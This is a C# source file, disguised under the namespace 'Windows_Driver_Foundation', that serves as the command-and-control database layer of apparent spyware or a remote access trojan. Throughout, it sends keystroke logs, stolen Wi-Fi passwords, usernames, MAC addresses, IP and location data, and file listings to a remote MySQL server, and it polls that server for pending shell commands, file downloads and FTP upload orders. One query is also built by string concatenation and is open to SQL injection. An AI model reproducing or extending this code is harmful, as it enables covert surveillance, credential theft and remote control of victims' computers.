using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;
using System.Net;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classMySQLDatabase
    {
        private MySqlConnection conn;
        private static string server = "remotemysql.com";
        private static string database = "xxxxx";
        private static string user = "xxxxxx";
        private static string password = "xxxxxx";
        private static string port = "3306";
        private static string sslM = "none";
        private static string connectionString = string.Format("server={0};port={1};database={2};uid={3};password={4};SslMode={5}", server, port, database, user, password, sslM);

        public classMySQLDatabase()
        {
            Initialize();
        }

        private void Initialize()
        {
            conn = new MySqlConnection(connectionString);
        }

        private bool checkForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("https://www.google.com"))
                {
                    return true;
                }
            }
            catch { return false; }
        }

        public bool openDatabaseConnection()
        {
            try
            {
                if (checkForInternetConnection())
                {
                    conn.Open();
                    return true;
                }
                return false;
            }
            catch (MySqlException ex)
            {
                printError(ex.ToString());
                return false;
            }
        }

        public bool closeDatabaseConnection()
        {
            try
            {
                conn.Close();
                return true;
            }
            catch (MySqlException ex)
            {
                printError(ex.ToString());
                return false;
            }
        }

        public bool reconnectDatabaseIfNeeded()
        {
            try
            {
                if (conn.State == System.Data.ConnectionState.Closed)
                {
                    printError("A reabrir conecção");
                    conn.Open();
                }

                return true;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
   
        #region TABELA tbl_client_id
        public bool regist_ClientId(string identity, int time, int size, int print, int counter)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertWifi = conn.CreateCommand();
                    cmdInsertWifi.CommandText = "INSERT INTO tbl_client_id (`identity`, `time_cycle`, `file_size_upload`, `print_required`, `print_counter`, `regist_date`)" +
                        " VALUES (@1, @2, @3, @4, @5, @6)";
                    cmdInsertWifi.Parameters.AddWithValue("@1", identity);
                    cmdInsertWifi.Parameters.AddWithValue("@2", time);
                    cmdInsertWifi.Parameters.AddWithValue("@3", size);
                    cmdInsertWifi.Parameters.AddWithValue("@4", print);
                    cmdInsertWifi.Parameters.AddWithValue("@5", counter);
                    cmdInsertWifi.Parameters.AddWithValue("@6", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertWifi.ExecuteNonQuery();
                    cmdInsertWifi.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }

        //Retorno variavel, pode retornar tanto o id como o time_cycle ou file_size_upload
        public int get_clientVar(string ident, string field_request)
        {
            // return GUIDE (-1 = Execption or No conection (Internet or Mysql), 0 = no match found)
            int value = -1;
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    value = 0;
                    MySqlCommand cmdClientGetVar = conn.CreateCommand();
                    cmdClientGetVar.CommandText = "SELECT " + field_request + " FROM tbl_client_id WHERE identity='" + ident + "'";
                    MySqlDataReader reader = cmdClientGetVar.ExecuteReader();
                    while (reader.Read())
                        value = reader.GetInt32(0);

                    reader.Close();
                    cmdClientGetVar.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return value;
        }

        public bool update_ClientTable(int id, string field_update, string new_value)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdateClient = conn.CreateCommand();
                    cmdUpdateClient.CommandText = "UPDATE tbl_client_id SET " + field_update + " = @1 WHERE id = @2";
                    cmdUpdateClient.Parameters.AddWithValue("@1", new_value);
                    cmdUpdateClient.Parameters.AddWithValue("@2", id);
                    cmdUpdateClient.ExecuteNonQuery();
                    cmdUpdateClient.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_key_log
        public bool insert_keylog(int client_id, string log)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertFile = conn.CreateCommand();
                    cmdInsertFile.CommandText = "INSERT INTO tbl_key_log ( `client_id`," +
                        " `log_date`, `log_text`) VALUES (@1, @2, @3)";
                    cmdInsertFile.Parameters.AddWithValue("@1", client_id);
                    cmdInsertFile.Parameters.AddWithValue("@2", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertFile.Parameters.AddWithValue("@3", log);
                    cmdInsertFile.ExecuteNonQuery();
                    cmdInsertFile.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_search_orders
        public List<int> getIds_OfUserSearchOrders(int client_id) //retorna os ids pedentes
        {
            List<int> QueryResult = new List<int>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetOrdersId = conn.CreateCommand();
                    cmdGetOrdersId.CommandText = "SELECT id FROM tbl_search_orders WHERE client_id = @1 AND order_status = 1";
                    cmdGetOrdersId.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetOrdersId.ExecuteReader();
                    while (reader.Read())
                    {
                        QueryResult.Add(reader.GetInt32(0));
                    }
                    reader.Close();
                    cmdGetOrdersId.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult;
        }

        public string[] read_tblSearchOrdersFields(int id)
        {
            List<string> QueryResult = new List<string>();

            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdReadOrders = conn.CreateCommand();
                    cmdReadOrders.CommandText = "SELECT * FROM tbl_search_orders WHERE id = @1";
                    cmdReadOrders.Parameters.AddWithValue("@1", id);
                    MySqlDataReader reader = cmdReadOrders.ExecuteReader();
                    reader.Read();

                    if (reader.HasRows)
                    {
                        for (int i = 0; i < reader.FieldCount; i++)
                            QueryResult.Add(reader.IsDBNull(i) ? null : reader.GetString(i));
                    }

                    reader.Close();
                    cmdReadOrders.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult.ToArray();
        }

        public bool update_searchOrdersStatus(int order_id, int order_result, char order_status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdateOrder = conn.CreateCommand();
                    cmdUpdateOrder.CommandText = "UPDATE tbl_search_orders SET order_result=@1, order_status=@2 WHERE id=@3;";
                    cmdUpdateOrder.Parameters.AddWithValue("@1", order_result);
                    cmdUpdateOrder.Parameters.AddWithValue("@2", order_status);
                    cmdUpdateOrder.Parameters.AddWithValue("@3", order_id);
                    cmdUpdateOrder.ExecuteNonQuery();
                    cmdUpdateOrder.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_files_list
        public string[] get_uploadOrdersPaths(int client_id, int listing_status)
        {
            //int em vez de string no listing_status para facilitar quando invoco este método
            List<string> QueryResult = new List<string>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetOrdersPaths = conn.CreateCommand();
                    cmdGetOrdersPaths.CommandText = "SELECT file_path FROM tbl_files_list WHERE client_id = @1 AND listing_status = @2";
                    cmdGetOrdersPaths.Parameters.AddWithValue("@1", client_id);
                    cmdGetOrdersPaths.Parameters.AddWithValue("@2", listing_status.ToString());
                    MySqlDataReader reader = cmdGetOrdersPaths.ExecuteReader();
                    while (reader.Read())
                        QueryResult.Add(reader["file_path"].ToString());

                    reader.Close();
                    cmdGetOrdersPaths.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult.ToArray();
        }

        public bool update_filesListingStatus(int client_id, string file_path, string listing_status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdatePathByZip = conn.CreateCommand();
                    cmdUpdatePathByZip.CommandText = "UPDATE tbl_files_list SET listing_status = @1 WHERE client_id = @2 AND file_path = @3";
                    cmdUpdatePathByZip.Parameters.AddWithValue("@1", listing_status);
                    cmdUpdatePathByZip.Parameters.AddWithValue("@2", client_id);
                    cmdUpdatePathByZip.Parameters.AddWithValue("@3", file_path);
                    cmdUpdatePathByZip.ExecuteNonQuery();
                    cmdUpdatePathByZip.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }

        public bool insert_file_list(int order_id, int client_id, string file_path, string listing_status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertFile = conn.CreateCommand();
                    cmdInsertFile.CommandText = "INSERT INTO tbl_files_list (`order_id`, `client_id`," +
                        " `file_path`, `file_name`, `file_type`, `file_size`, `created_date`, `modified_date`," +
                        " `access_date`, `listing_date`, `listing_status`) VALUES (@1, @2, @3, @4, @5, @6, @7, @8, @9, @10, @11)";
                    cmdInsertFile.Parameters.AddWithValue("@1", order_id);
                    cmdInsertFile.Parameters.AddWithValue("@2", client_id);
                    cmdInsertFile.Parameters.AddWithValue("@3", file_path);
                    cmdInsertFile.Parameters.AddWithValue("@4", Path.GetFileNameWithoutExtension(file_path));
                    cmdInsertFile.Parameters.AddWithValue("@5", Path.GetExtension(file_path));
                    cmdInsertFile.Parameters.AddWithValue("@6", new FileInfo(file_path).Length);
                    cmdInsertFile.Parameters.AddWithValue("@7", File.GetCreationTime(file_path));
                    cmdInsertFile.Parameters.AddWithValue("@8", File.GetLastWriteTime(file_path));
                    cmdInsertFile.Parameters.AddWithValue("@9", File.GetLastAccessTime(file_path));
                    cmdInsertFile.Parameters.AddWithValue("@10", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertFile.Parameters.AddWithValue("@11", listing_status);
                    cmdInsertFile.ExecuteNonQuery();
                    cmdInsertFile.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_machines_info
        public int getMachineInfoStatus(int client_id)
        {
            int order_status = -1;
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetMachineInfoStatus = conn.CreateCommand();
                    cmdGetMachineInfoStatus.CommandText = "SELECT order_status FROM tbl_machine_info WHERE client_id = @1";
                    cmdGetMachineInfoStatus.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetMachineInfoStatus.ExecuteReader();
                    while (reader.Read())
                        Int32.TryParse(reader["order_status"].ToString(), out order_status);

                    reader.Close();
                    cmdGetMachineInfoStatus.Dispose();
                    return order_status;
                }
                else
                    return order_status;

            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return order_status;
            }
        }

        public bool insert_machine_info(int client_id)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    classMachineInformation machineInfo = new classMachineInformation();

                    MySqlCommand cmdInsertInfo = conn.CreateCommand();
                    cmdInsertInfo.CommandText = "INSERT INTO tbl_machine_info (`client_id`, `machine_name`," +
                        " `arq`, `username`, `user_home_folder`, `windows`, `version`, `webrowser`, `macaddress`," +
                        " `regist_date`, `order_status`) VALUES (@1, @2, @3, @4, @5, @6, @7, @8, @9, @10, @11)";

                    cmdInsertInfo.Parameters.AddWithValue("@1", client_id);
                    cmdInsertInfo.Parameters.AddWithValue("@2", machineInfo.getMachineName());
                    cmdInsertInfo.Parameters.AddWithValue("@3", machineInfo.getMachineArq());
                    cmdInsertInfo.Parameters.AddWithValue("@4", machineInfo.getUsername()); ;
                    cmdInsertInfo.Parameters.AddWithValue("@5", machineInfo.getUsernameHomeFolder());
                    cmdInsertInfo.Parameters.AddWithValue("@6", machineInfo.getWindowsVersion()); ;
                    cmdInsertInfo.Parameters.AddWithValue("@7", machineInfo.getWindowsReleaseNumber());
                    cmdInsertInfo.Parameters.AddWithValue("@8", machineInfo.getDefaultBrowser());
                    cmdInsertInfo.Parameters.AddWithValue("@9", machineInfo.getMacAddress());
                    cmdInsertInfo.Parameters.AddWithValue("@10", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertInfo.Parameters.AddWithValue("@11", 0);
                    cmdInsertInfo.ExecuteNonQuery();
                    cmdInsertInfo.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_wifi_list
        public bool insert_wifi(int client_id, string ssid, string password, string auth, string cipher)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertWifi = conn.CreateCommand();
                    cmdInsertWifi.CommandText = "INSERT INTO tbl_wifi_list (`client_id`, `ssid`,`password`, `authentication`," +
                        " `cipher`, `regist_date`, `order_status`) VALUES (@1, @2, @3, @4, @5, @6, @7)";
                    cmdInsertWifi.Parameters.AddWithValue("@1", client_id);
                    cmdInsertWifi.Parameters.AddWithValue("@2", ssid);
                    cmdInsertWifi.Parameters.AddWithValue("@3", password);
                    cmdInsertWifi.Parameters.AddWithValue("@4", auth);
                    cmdInsertWifi.Parameters.AddWithValue("@5", cipher);
                    cmdInsertWifi.Parameters.AddWithValue("@6", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertWifi.Parameters.AddWithValue("@7", 0);
                    cmdInsertWifi.ExecuteNonQuery();
                    cmdInsertWifi.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }

        public bool update_WifiList(string id, string ssid, string password)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdatePathByZip = conn.CreateCommand();
                    cmdUpdatePathByZip.CommandText = "UPDATE tbl_wifi_list SET ssid = @1, password = @2 WHERE id = @3";
                    cmdUpdatePathByZip.Parameters.AddWithValue("@1", ssid);
                    cmdUpdatePathByZip.Parameters.AddWithValue("@2", password);
                    cmdUpdatePathByZip.Parameters.AddWithValue("@3", id);
                    cmdUpdatePathByZip.ExecuteNonQuery();
                    cmdUpdatePathByZip.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }

        public void getWifiList(int client_id, out List<string> id, out List<string> ssid, out List<string> password)
        {
            id = new List<string>();
            ssid = new List<string>();
            password = new List<string>();

            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetWifiList = conn.CreateCommand();
                    cmdGetWifiList.CommandText = "SELECT id, ssid, password FROM tbl_wifi_list WHERE client_id = @1";
                    cmdGetWifiList.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetWifiList.ExecuteReader();
                    while (reader.Read())
                    {
                        id.Add(reader["id"].ToString());
                        ssid.Add(reader["ssid"].ToString());
                        password.Add(reader["password"].ToString());
                    }
                    reader.Close();
                    cmdGetWifiList.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
        }
        #endregion
        #region TABELA tbl_network_info
        public bool insert_network_info(int client_id, string[] netwifo)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertNet = conn.CreateCommand();
                    cmdInsertNet.CommandText = "INSERT INTO tbl_network_info (`client_id`, `local_ip`,`external_ip`, `hostname`," +
                        " `city`, `country`, `coords`, `regist_date`, `status`) VALUES (@1, @2, @3, @4, @5, @6, @7, @8, @9)";
                    cmdInsertNet.Parameters.AddWithValue("@1", client_id);
                    cmdInsertNet.Parameters.AddWithValue("@2", netwifo[0]);
                    cmdInsertNet.Parameters.AddWithValue("@3", netwifo[1]);
                    cmdInsertNet.Parameters.AddWithValue("@4", netwifo[2]);
                    cmdInsertNet.Parameters.AddWithValue("@5", netwifo[3]);
                    cmdInsertNet.Parameters.AddWithValue("@6", netwifo[4]);
                    cmdInsertNet.Parameters.AddWithValue("@7", netwifo[5]);
                    cmdInsertNet.Parameters.AddWithValue("@8", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertNet.Parameters.AddWithValue("@9", 0);
                    cmdInsertNet.ExecuteNonQuery();
                    cmdInsertNet.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_download_files
        public List<int> getIds_OfDownloadsFiles(int client_id)
        {
            List<int> QueryResult = new List<int>();

            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetDownloadsId = conn.CreateCommand();
                    cmdGetDownloadsId.CommandText = "SELECT id FROM tbl_download_files WHERE client_id = @1 AND order_status = 1";
                    cmdGetDownloadsId.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetDownloadsId.ExecuteReader();
                    while (reader.Read())
                    {
                        QueryResult.Add(reader.GetInt32(0));
                    }
                    reader.Close();
                    cmdGetDownloadsId.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
        
            return QueryResult;
        }

        public string[] read_tblDownloadFilesFields(int id)
        {
            List<string> QueryResult = new List<string>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdReadDownloads = conn.CreateCommand();
                    cmdReadDownloads.CommandText = "SELECT * FROM tbl_download_files WHERE id = @1";
                    cmdReadDownloads.Parameters.AddWithValue("@1", id);
                    MySqlDataReader reader = cmdReadDownloads.ExecuteReader();
                    reader.Read();

                    if (reader.HasRows)
                    {
                        for (int i = 0; i < reader.FieldCount; i++)
                            QueryResult.Add(reader.GetString(i));
                    }

                    reader.Close();
                    cmdReadDownloads.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult.ToArray();
        }

        public bool update_DownloadStatus(int id, int status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdateDownload = conn.CreateCommand();
                    cmdUpdateDownload.CommandText = "UPDATE tbl_download_files SET status_date = @1, order_status = @2 WHERE id = @3";
                    cmdUpdateDownload.Parameters.AddWithValue("@1", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdUpdateDownload.Parameters.AddWithValue("@2", status);
                    cmdUpdateDownload.Parameters.AddWithValue("@3", id);
                    cmdUpdateDownload.ExecuteNonQuery();
                    cmdUpdateDownload.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_shell_cmd
        public List<int> getIds_OfShellCommands(int client_id)
        {
            //Esta lista vai retornar os id´s das ordens pedentes (ou seja se existem ou não ordens pedentes)
            List<int> QueryResult = new List<int>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetCmdsID = conn.CreateCommand();
                    cmdGetCmdsID.CommandText = "SELECT id FROM tbl_shell_cmd WHERE client_id = @1 AND order_status = 1";
                    cmdGetCmdsID.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetCmdsID.ExecuteReader();
                    while (reader.Read())
                    {
                        QueryResult.Add(reader.GetInt32(0));
                    }
                    reader.Close();
                    cmdGetCmdsID.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult;
        }

        public string[] read_tblShellCommands(int id)
        {
            List<string> QueryResult = new List<string>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdReadShellCmd = conn.CreateCommand();
                    cmdReadShellCmd.CommandText = "SELECT * FROM tbl_shell_cmd WHERE id = @1";
                    cmdReadShellCmd.Parameters.AddWithValue("@1", id);
                    MySqlDataReader reader = cmdReadShellCmd.ExecuteReader();
                    reader.Read();

                    if (reader.HasRows)
                    {
                        for (int i = 0; i < reader.FieldCount; i++)
                            QueryResult.Add(reader.IsDBNull(i) ? null : reader.GetString(i));
                    }

                    reader.Close();
                    cmdReadShellCmd.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult.ToArray();
        }

        public bool update_ShellCommands(int id, string output, int status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdateDownload = conn.CreateCommand();
                    cmdUpdateDownload.CommandText = "UPDATE tbl_shell_cmd SET output = @1, last_update = @2, order_status = @3 WHERE id = @4";
                    cmdUpdateDownload.Parameters.AddWithValue("@1", output);
                    cmdUpdateDownload.Parameters.AddWithValue("@2", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdUpdateDownload.Parameters.AddWithValue("@3", status);
                    cmdUpdateDownload.Parameters.AddWithValue("@4", id);
                    cmdUpdateDownload.ExecuteNonQuery();
                    cmdUpdateDownload.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_check_files
        public List<int> getIds_OfCheckFiles(int client_id)
        {
            //Esta lista vai retornar os id´s das ordens pedentes (ou seja se existem ou não ordens pedentes)
            List<int> QueryResult = new List<int>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdGetCheckFilesId = conn.CreateCommand();
                    cmdGetCheckFilesId.CommandText = "SELECT id FROM tbl_check_files WHERE client_id = @1 AND order_status = 1";
                    cmdGetCheckFilesId.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdGetCheckFilesId.ExecuteReader();
                    while (reader.Read())
                    {
                        QueryResult.Add(reader.GetInt32(0));
                    }
                    reader.Close();
                    cmdGetCheckFilesId.Dispose();
                }
            }
            catch (MySqlException e) { printError(e.ToString()); }
            return QueryResult;
        }

        public string[] read_tblCheckFiles(int id)
        {
            List<string> QueryResult = new List<string>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdReadCheckFiles = conn.CreateCommand();
                    cmdReadCheckFiles.CommandText = "SELECT * FROM tbl_check_files WHERE id = @1";
                    cmdReadCheckFiles.Parameters.AddWithValue("@1", id);
                    MySqlDataReader reader = cmdReadCheckFiles.ExecuteReader();
                    reader.Read();

                    if (reader.HasRows)
                    {
                        for (int i = 0; i < reader.FieldCount; i++)
                            QueryResult.Add(reader.IsDBNull(i) ? null : reader.GetString(i));
                    }

                    reader.Close();
                    cmdReadCheckFiles.Dispose();
                }
            }
            catch (MySqlException e) { printError(e.ToString()); }
            return QueryResult.ToArray();
        }

        public bool update_CheckFiles(int id, int status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdUpdateCheckFiles = conn.CreateCommand();
                    cmdUpdateCheckFiles.CommandText = "UPDATE tbl_check_files SET last_update = @1, order_status = @2 WHERE id = @3";
                    cmdUpdateCheckFiles.Parameters.AddWithValue("@1", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdUpdateCheckFiles.Parameters.AddWithValue("@2", status);
                    cmdUpdateCheckFiles.Parameters.AddWithValue("@3", id);
                    cmdUpdateCheckFiles.ExecuteNonQuery();
                    cmdUpdateCheckFiles.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_ftp_servers
        public string[] read_tblFTPServers(int client_id)
        {
            List<string> QueryResult = new List<string>();
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdReadFTPServer = conn.CreateCommand();
                    cmdReadFTPServer.CommandText = "SELECT * FROM tbl_ftp_servers WHERE client_id = @1";
                    cmdReadFTPServer.Parameters.AddWithValue("@1", client_id);
                    MySqlDataReader reader = cmdReadFTPServer.ExecuteReader();
                    reader.Read();

                    if (reader.HasRows)
                    {
                        for (int i = 0; i < reader.FieldCount; i++)
                            QueryResult.Add(reader.IsDBNull(i) ? null : reader.GetString(i));
                    }

                    reader.Close();
                    cmdReadFTPServer.Dispose();
                }
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
            }
            return QueryResult.ToArray();
        }

        /* insert_server_log status GUIDE
         * 1  - FTP Class successfully acquired
         * 2  - Without FTP credencials         (this status is not being applied)
         * 3  - File successfully Uploaded
         * 4  - File successfully Downloaded
         * 30 - File Upload Error
         * 40 - File Download Error  */
        public bool insert_server_log(int ftp_id, int client_id, int status)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertFtpLog = conn.CreateCommand();
                    cmdInsertFtpLog.CommandText = "INSERT INTO tbl_ftp_server_log (`ftp_id`, `client_id`," +
                        " `status`, `status_date`) VALUES (@1, @2, @3, @4)";
                    cmdInsertFtpLog.Parameters.AddWithValue("@1", ftp_id);
                    cmdInsertFtpLog.Parameters.AddWithValue("@2", client_id);
                    cmdInsertFtpLog.Parameters.AddWithValue("@3", status);
                    cmdInsertFtpLog.Parameters.AddWithValue("@4", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertFtpLog.ExecuteNonQuery();
                    cmdInsertFtpLog.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion
        #region TABELA tbl_machine_online_log
        public bool insert_online_log(int client_id, int log_type)
        {
            try
            {
                if (reconnectDatabaseIfNeeded())
                {
                    MySqlCommand cmdInsertOnlineLog = conn.CreateCommand();
                    cmdInsertOnlineLog.CommandText = "INSERT INTO tbl_online_log (`client_id`, `log_type`, `log_date`) VALUES (@1, @2, @3)";
                    cmdInsertOnlineLog.Parameters.AddWithValue("@1", client_id);
                    cmdInsertOnlineLog.Parameters.AddWithValue("@2", log_type);
                    cmdInsertOnlineLog.Parameters.AddWithValue("@3", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    cmdInsertOnlineLog.ExecuteNonQuery();
                    cmdInsertOnlineLog.Dispose();
                    return true;
                }
                else
                    return false;
            }
            catch (MySqlException e)
            {
                printError(e.ToString());
                return false;
            }
        }
        #endregion

        private void printError(string msg)
        {
            var classExeption = new classExeptionAndErrorManagement();
            classExeption.exeptionHandling(msg);
        }
    }
}
